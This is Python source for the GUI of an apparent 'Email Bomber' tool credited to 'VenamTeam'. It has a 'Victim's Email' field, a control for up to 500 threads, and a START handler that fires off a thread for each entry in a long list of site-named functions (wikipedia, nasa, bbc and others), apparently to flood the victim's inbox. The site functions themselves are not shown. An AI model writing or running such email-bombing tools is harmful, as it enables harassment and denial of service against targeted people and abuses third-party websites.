my_list = [wikipedia,fessebook,nasa,aphoto,tcdai,foundazion,earzik,dailytrojan,sourceforge,hc, msha, cdc,devcentral,bruzel,beee,dexigneur,orasco,pint,cofe,steve,tattoo,proxy,tips,dora,nin,eib,mailman,art,designf,wiliam,infacta,wagov,bbc,uki,HMT,edge,frb,ars,nie,flori,pirate,heroic,garden,lost,SAS,burk,warwick,marine,soleil,council,timedate,google,OCC,revenue,royal,windows,socialist,com,toronto,bounty,publis,IOSS,clickz,cream,cali,etett,myvoice,core77,mondediplo,statee,wordi,wblizi]
####################END OF THE BIG LIST#####################

[wxID_EMAILBOMBER, wxID_EMAILBOMBERABOUTBUTTON, wxID_EMAILBOMBEREMAIL,
 wxID_EMAILBOMBERINFORMATION, wxID_EMAILBOMBERLISTBOXFORINFOS,
 wxID_EMAILBOMBERNBTHREADLABEL, wxID_EMAILBOMBERPANEL1,
 wxID_EMAILBOMBERSTARTBUTTON, wxID_EMAILBOMBERVENAMTEAMBOMBER,
 wxID_EMAILBOMBERVICTIMEMAILLABEL, wxID_EMAILBOMBERWHEELTHREAD,
] = [wx.NewId() for _init_ctrls in range(11)]


#######################THE GUI######################################
class EmailBomber(wx.Frame):
    def _init_ctrls(self, prnt):
        # generated method , don't edit

        wx.Frame.__init__(self, id=wxID_EMAILBOMBER, name=u'EmailBomber',
              parent=prnt, pos=wx.Point(455, 284), size=wx.Size(392, 236),
              style=wx.DEFAULT_FRAME_STYLE, title=u"VenamTeam's Email Bomber")
        self.SetClientSize(wx.Size(550, 236))

        self.panel1 = wx.Panel(id=wxID_EMAILBOMBERPANEL1, name='panel1',
              parent=self, pos=wx.Point(0, 0), size=wx.Size(392, 236),
              style=wx.TAB_TRAVERSAL)
        ##FOR THE BG : (I changed the parent from self.panel1 => self.bitmap)
        image_file = 'background.jpg'
        bmp = wx.Bitmap(image_file)
        self.bitmap = wx.StaticBitmap(self.panel1, wx.ID_ANY, bmp, (0, 0))

        self.startbutton = wx.Button(id=wxID_EMAILBOMBERSTARTBUTTON,
              label=u'START', name=u'startbutton', parent=self.panel1,
              pos=wx.Point(230, 200), size=wx.Size(85, 28), style=0)
        #creating a button event handler
        self.startbutton.Bind(wx.EVT_BUTTON, self.ONstartbutton)

        self.wheelthread = wx.SpinCtrl(id=wxID_EMAILBOMBERWHEELTHREAD,
              initial=1, max=500, min=1, name=u'wheelthread',
              parent=self.panel1, pos=wx.Point(415, 54), size=wx.Size(51, 22),
              style=wx.SP_ARROW_KEYS)

        self.nbthreadlabel = wx.StaticText(id=wxID_EMAILBOMBERNBTHREADLABEL,
              label=u'Number of threads working at the same time : ',
              name=u'nbthreadlabel', parent=self.panel1, pos=wx.Point(87, 57),
              size=wx.Size(312, 16), style=0)
        self.nbthreadlabel.SetForegroundColour((255,255,255))
        self.nbthreadlabel.SetBackgroundColour((255,255,255))

        self.victimemaillabel = wx.StaticText(id=wxID_EMAILBOMBERVICTIMEMAILLABEL,
              label=u"Victim's Email : ", name=u'victimemaillabel',
              parent=self.panel1, pos=wx.Point(87, 33), size=wx.Size(112, 16),
              style=0)
        self.victimemaillabel.SetForegroundColour((255,255,255))
        self.victimemaillabel.SetBackgroundColour((255,255,255))

        self.Email = wx.TextCtrl(id=wxID_EMAILBOMBEREMAIL, name=u'Email',
              parent=self.panel1, pos=wx.Point(211, 29), size=wx.Size(256, 22),
              style=0, value=u'Email')

        self.listboxforINFOS = wx.ListBox(choices=[],
              id=wxID_EMAILBOMBERLISTBOXFORINFOS, name='update',
              parent=self.panel1, pos=wx.Point(17, 106), size=wx.Size(518, 88),
              style=0)

        self.information = wx.StaticText(id=wxID_EMAILBOMBERINFORMATION,
              label=u'Informations :', name=u'information', parent=self.panel1,
              pos=wx.Point(223, 87), size=wx.Size(94, 16), style=0)
        self.information.SetForegroundColour((255,255,255))
        self.information.SetBackgroundColour((255,255,255))

        self.Venamteambomber = wx.StaticText(id=wxID_EMAILBOMBERVENAMTEAMBOMBER,
              label=u'VenamTeam\'s Email Bomber', name=u'Venamteambomber',
              parent=self.panel1, pos=wx.Point(175, 6), size=wx.Size(202, 18),
              style=0)
        self.Venamteambomber.SetFont(wx.Font(11, wx.SWISS, wx.NORMAL, wx.NORMAL,
              True, u'Verdana'))
        self.Venamteambomber.SetForegroundColour((255,255,255))
        self.Venamteambomber.SetBackgroundColour((255,255,255))

        self.aboutbutton = wx.Button(id=wxID_EMAILBOMBERABOUTBUTTON,
              label=u'About', name=u'aboutbutton', parent=self.panel1,
              pos=wx.Point(406, 200), size=wx.Size(50, 28), style=0)
        self.aboutbutton.SetFont(wx.Font(8, wx.SWISS, wx.NORMAL, wx.NORMAL,
              False, u'Verdana'))

        #creating a button event handler
        self.aboutbutton.Bind(wx.EVT_BUTTON, self.ONaboutbutton)



    def __init__(self, parent):
        self._init_ctrls(parent)
        #Handle thing going in the logs box
        Publisher().subscribe(self.updateList, "update")

    #---Start events/actions handlers
    def ONaboutbutton(self,event):
        d= wx.MessageDialog( self, "This Program was coded by Venam, toki and with the help of CoBrAxXx(VenamTeam)\nPlease Do Not Overuse it!\nEnjoy!","Infos", wx.OK)
        #create msg wth ok button
        d.ShowModal() #show it
        d.Destroy() #destroy it when finished

    #update the printing list
    def updateList(self, result):
        try:
            now = datetime.datetime.now()
            self.listboxforINFOS.AppendAndEnsureVisible("{0:<20}{1}".format(now.strftime("[%H:%M:%S]") , result.data))
        except wx.PyDeadObjectError:
            sys.exit(0)

    def ONstartbutton(self, evt):
        #GET THE EMAIL
        self.email = str(self.Email.GetValue())
        #GET THE NB OF THREADS
        self.nbthreads = int(self.wheelthread.GetValue())

        if len(my_list) >= self.nbthreads:
            z = chunkIt(my_list, self.nbthreads)
            for functions in z:
                for function in functions:
                    threading.Thread(target=function, args=(self.email,)).start()
                #threading.Thread(target=fuckginfunctions, args=(functions,self.email)).start()
        else:
            z = chunkIt(my_list, self.nbthreads)
            for functions in z:
                for function in functions:
                    threading.Thread(target=function, args=(self.email,)).start()
                #threading.Thread(target=fuckginfunctions, args=(functions,self.email,)).start()

#########################END OF THE GUI###################################



if __name__ == '__main__':
    app = wx.PySimpleApp()
    frame = create(None)
    frame.Show()

    app.MainLoop()
